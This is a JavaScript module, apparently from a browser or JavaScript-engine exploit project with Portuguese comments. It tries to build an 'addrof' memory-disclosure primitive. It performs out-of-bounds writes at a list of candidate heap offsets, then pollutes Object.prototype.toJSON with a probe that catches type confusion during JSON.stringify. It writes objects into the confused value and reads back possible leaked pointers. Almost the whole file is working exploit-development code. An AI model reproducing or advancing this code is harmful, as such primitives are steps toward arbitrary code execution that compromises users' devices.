// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v10_MultiOffsetCorruption)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V10_MOC = "OriginalHeisenbug_TypedArrayAddrof_v10_MultiOffsetCorruption";

const VICTIM_BUFFER_SIZE = 256;
// const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C; // Agora será um array
const OOB_WRITE_VALUE = 0xFFFFFFFF; // Valor a ser escrito

// Array de offsets para testar a corrupção OOB
const OOB_TARGET_OFFSETS_V10 = [
    0x7C, // Original, HEISENBUG_OOB_DATAVIEW_METADATA_BASE (0x58) + HEISENBUG_OOB_DATAVIEW_MLENGTH_OFFSET (0x24)
    0x70, // Se 0x58 fosse ArrayBufferView, este seria M_LENGTH_OFFSET (0x58 + 0x18)
    0x68, // Se 0x58 fosse ArrayBufferView, este seria M_VECTOR_OFFSET (0x58 + 0x10)
    0x78, // Um pouco antes de 0x7C
    0x74  // Um pouco antes de 0x78, e M_MODE_OFFSET se 0x58 for ABV (0x58 + 0x1C)
];


let last_probe_call_details_v10 = null; 
let object_to_leak_A_v10 = null;
let object_to_leak_B_v10 = null;
let victim_typed_array_ref_v10 = null;

function toJSON_TA_Probe_MultiOffsetCorruption() {
    let current_call_details = {
        probe_variant: "TA_Probe_Addrof_v10_MultiOffsetCorruption",
        this_type_in_toJSON: "N/A_before_call",
        error_in_toJSON: null,
        probe_called: true,
        this_was_victim_ref_when_confused: null,
        writes_attempted_on_confused_this: false
    };

    try {
        current_call_details.this_type_in_toJSON = Object.prototype.toString.call(this);
        
        logS3(`[${current_call_details.probe_variant}] Sonda INVOCADA. 'this' type: ${current_call_details.this_type_in_toJSON}. 'this' === victim_typed_array_ref_v10? ${this === victim_typed_array_ref_v10}`, "leak");

        if (current_call_details.this_type_in_toJSON === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] TYPE CONFUSION DETECTED for 'this' (now [object Object])!`, "vuln");
            
            current_call_details.this_was_victim_ref_when_confused = (this === victim_typed_array_ref_v10);
            logS3(`[${current_call_details.probe_variant}] At confusion, 'this' === victim_typed_array_ref_v10? ${current_call_details.this_was_victim_ref_when_confused}`, "info");

            logS3(`[${current_call_details.probe_variant}] Attempting addrof writes on the confused 'this' ([object Object])...`, "warn");
            if (object_to_leak_A_v10) {
                this[0] = object_to_leak_A_v10; // Continua escrevendo no 'this' confuso
                logS3(`[${current_call_details.probe_variant}] Wrote object_to_leak_A_v10 to this[0].`, "info");
            }
            if (object_to_leak_B_v10) {
                this[1] = object_to_leak_B_v10;
                logS3(`[${current_call_details.probe_variant}] Wrote object_to_leak_B_v10 to this[1].`, "info");
            }
            current_call_details.writes_attempted_on_confused_this = true;

        } else if (this === victim_typed_array_ref_v10) {
            logS3(`[${current_call_details.probe_variant}] 'this' is victim_typed_array_ref_v10, type is ${current_call_details.this_type_in_toJSON}. No confusion for this 'this' in this call.`, "info");
        } else {
            logS3(`[${current_call_details.probe_variant}] 'this' (type: ${current_call_details.this_type_in_toJSON}) is not victim_typed_array_ref_v10. No action.`, "warn");
        }

    } catch (e) {
        current_call_details.error_in_toJSON = `${e.name}: ${e.message}`;
        logS3(`[${current_call_details.probe_variant}] ERROR in probe: ${e.name} - ${e.message}`, "error");
    }
    
    last_probe_call_details_v10 = { ...current_call_details }; 
    logS3(`[${current_call_details.probe_variant}] Probe FINISHING. Global 'last_probe_call_details_v10' updated. Returning undefined.`, "dev_verbose");

    return undefined;
}

export async function executeTypedArrayVictimAddrofTest_MultiOffsetCorruption() {
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V10_MOC}`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug (MultiOffsetCorruption) & Addrof Attempt ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V10_MOC} Init...`;

    let overall_results = [];
    let main_error_occurred = null;

    for (const current_oob_target_offset of OOB_TARGET_OFFSETS_V10) {
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Offset_${toHex(current_oob_target_offset)}`;
        logS3(`\n===== ITERATION: Testing OOB Target Offset: ${toHex(current_oob_target_offset)} =====`, "subtest", FNAME_CURRENT_ITERATION);

        last_probe_call_details_v10 = null;
        victim_typed_array_ref_v10 = null; 
        object_to_leak_A_v10 = { marker: `ObjA_TA_v10_${toHex(current_oob_target_offset)}`, id: Date.now() }; 
        object_to_leak_B_v10 = { marker: `ObjB_TA_v10_${toHex(current_oob_target_offset)}`, id: Date.now() + Math.floor(Math.random() * 1000) };

        let iterationError = null;
        let stringifyOutput = null;
        let captured_probe_details_for_iteration = null;
        
        let addrof_result_A = { success: false, message: "Not attempted or Heisenbug/write failed." };
        let addrof_result_B = { success: false, message: "Not attempted or Heisenbug/write failed." };
        
        const fillPattern = 0.50505050505050;

        try {
            await triggerOOB_primitive({ force_reinit: true }); // Reinit OOB for each offset to ensure clean state
            if (!oob_array_buffer_real && typeof oob_write_absolute !== 'function') {
                throw new Error("OOB Init failed or oob_write_absolute not available.");
            }
            logS3("OOB Environment initialized for iteration.", "info", FNAME_CURRENT_ITERATION);

            logS3(`STEP 1: Writing CRITICAL value ${toHex(OOB_WRITE_VALUE)} to oob_array_buffer_real[${toHex(current_oob_target_offset)}]...`, "warn", FNAME_CURRENT_ITERATION);
            oob_write_absolute(current_oob_target_offset, OOB_WRITE_VALUE, 4);
            logS3(`  Critical OOB write to ${toHex(current_oob_target_offset)} performed.`, "info", FNAME_CURRENT_ITERATION);
            
            await PAUSE_S3(100);

            victim_typed_array_ref_v10 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
            let float64_view_on_underlying_ab = new Float64Array(victim_typed_array_ref_v10.buffer); 
            
            for(let i = 0; i < float64_view_on_underlying_ab.length; i++) {
                float64_view_on_underlying_ab[i] = fillPattern + i;
            }

            logS3(`STEP 2: victim_typed_array_ref_v10 created. View filled.`, "test", FNAME_CURRENT_ITERATION);
            logS3(`   Attempting JSON.stringify with ${toJSON_TA_Probe_MultiOffsetCorruption.name}...`, "test", FNAME_CURRENT_ITERATION);
            
            const ppKey = 'toJSON';
            let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
            let pollutionApplied = false;

            try {
                Object.defineProperty(Object.prototype, ppKey, {
                    value: toJSON_TA_Probe_MultiOffsetCorruption,
                    writable: true, configurable: true, enumerable: false
                });
                pollutionApplied = true;

                stringifyOutput = JSON.stringify(victim_typed_array_ref_v10); 
                
                if (last_probe_call_details_v10) {
                    captured_probe_details_for_iteration = { ...last_probe_call_details_v10 }; 
                }
                logS3(`  Last probe call details for offset ${toHex(current_oob_target_offset)}: ${captured_probe_details_for_iteration ? JSON.stringify(captured_probe_details_for_iteration) : 'N/A'}`, "leak", FNAME_CURRENT_ITERATION);

                let heisenbugObserved = captured_probe_details_for_iteration?.this_type_in_toJSON === "[object Object]";
                if (heisenbugObserved) {
                     logS3(`  HEISENBUG ON 'this' OF PROBE CONFIRMED for offset ${toHex(current_oob_target_offset)}!`, "vuln", FNAME_CURRENT_ITERATION);
                } else {
                    logS3(`  Heisenbug on 'this' of probe NOT confirmed for offset ${toHex(current_oob_target_offset)}. Last type: ${captured_probe_details_for_iteration?.this_type_in_toJSON}`, "warn", FNAME_CURRENT_ITERATION);
                }
                    
                logS3("STEP 3: Checking float64_view_on_underlying_ab...", "warn", FNAME_CURRENT_ITERATION);
                const val_A = float64_view_on_underlying_ab[0];
                const val_B = float64_view_on_underlying_ab[1];
                let temp_int64_A = new AdvancedInt64(new Uint32Array(new Float64Array([val_A]).buffer)[0], new Uint32Array(new Float64Array([val_A]).buffer)[1]);
                let temp_int64_B = new AdvancedInt64(new Uint32Array(new Float64Array([val_B]).buffer)[0], new Uint32Array(new Float64Array([val_B]).buffer)[1]);

                addrof_result_A.leaked_address_as_double = val_A;
                addrof_result_A.leaked_address_as_int64 = temp_int64_A;
                 if (val_A !== (fillPattern + 0) && val_A !== 0 && (temp_int64_A.high() < 0x00020000 || (temp_int64_A.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                    addrof_result_A.success = true;
                    addrof_result_A.message = `Possible pointer for ObjA at offset ${toHex(current_oob_target_offset)}.`;
                } else {
                    addrof_result_A.message = `No pointer for ObjA at offset ${toHex(current_oob_target_offset)}. Value: ${val_A}`;
                }

                addrof_result_B.leaked_address_as_double = val_B;
                addrof_result_B.leaked_address_as_int64 = temp_int64_B;
                if (val_B !== (fillPattern + 1) && val_B !== 0 && (temp_int64_B.high() < 0x00020000 || (temp_int64_B.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                    addrof_result_B.success = true;
                    addrof_result_B.message = `Possible pointer for ObjB at offset ${toHex(current_oob_target_offset)}.`;
                } else {
                    addrof_result_B.message = `No pointer for ObjB at offset ${toHex(current_oob_target_offset)}. Value: ${val_B}`;
                }

            } catch (e_str) {
                iterationError = e_str;
                logS3(`    CRITICAL ERROR during stringify/addrof logic for offset ${toHex(current_oob_target_offset)}: ${e_str.name} - ${e_str.message}`, "critical", FNAME_CURRENT_ITERATION);
            } finally {
                if (pollutionApplied) {
                    Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor || { value: null, writable: true, configurable: true, enumerable: false });
                }
            }
        } catch (e_outer) {
            iterationError = e_outer;
            logS3(`CRITICAL ERROR in iteration for offset ${toHex(current_oob_target_offset)}: ${e_outer.name} - ${e_outer.message}`, "critical", FNAME_CURRENT_ITERATION);
        } finally {
            clearOOBEnvironment(); // Limpa para a próxima iteração ou fim do teste
        }
        
        overall_results.push({
            offset: toHex(current_oob_target_offset),
            error: iterationError ? `${iterationError.name}: ${iterationError.message}` : null,
            stringifyOutput: stringifyOutput ? stringifyOutput.substring(0,100)+"..." : null,
            probe_details: captured_probe_details_for_iteration,
            addrof_A: { ...addrof_result_A },
            addrof_B: { ...addrof_result_B }
        });
        
        if (addrof_result_A.success || addrof_result_B.success) {
            logS3(`!!!! POTENTIAL ADDROF SUCCESS at offset ${toHex(current_oob_target_offset)} !!!!`, "vuln", FNAME_CURRENT_ITERATION);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V10_MOC}: Addr? ${toHex(current_oob_target_offset)} SUCCESS!`;
            // Poderia adicionar um 'break;' aqui se quiser parar no primeiro sucesso.
        }
        await PAUSE_S3(200); // Pausa entre as iterações de offset
    } // Fim do loop for (const current_oob_target_offset...)

    // Log final resumido
    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed All Iterations ---`, "test", FNAME_CURRENT_TEST_BASE);
    overall_results.forEach(res => {
        logS3(`Offset ${res.offset}: AddrA Success=${res.addrof_A.success}, AddrB Success=${res.addrof_B.success}. Probe type: ${res.probe_details?.this_type_in_toJSON || 'N/A'}. Error: ${res.error || 'None'}`, 
              (res.addrof_A.success || res.addrof_B.success) ? "good" : "warn", FNAME_CURRENT_TEST_BASE);
    });
    
    // Definir título final com base nos resultados gerais
    if (!document.title.includes("SUCCESS")) {
         document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V10_MOC}: All Offsets Tested.`;
    }
    if (main_error_occurred) { // Se um erro principal ocorreu antes do loop
         document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V10_MOC}: Main Error!`;
    }


    return { 
        errorOccurred: main_error_occurred, // Erro principal antes/depois do loop (se houver)
        iteration_results: overall_results
    };
}
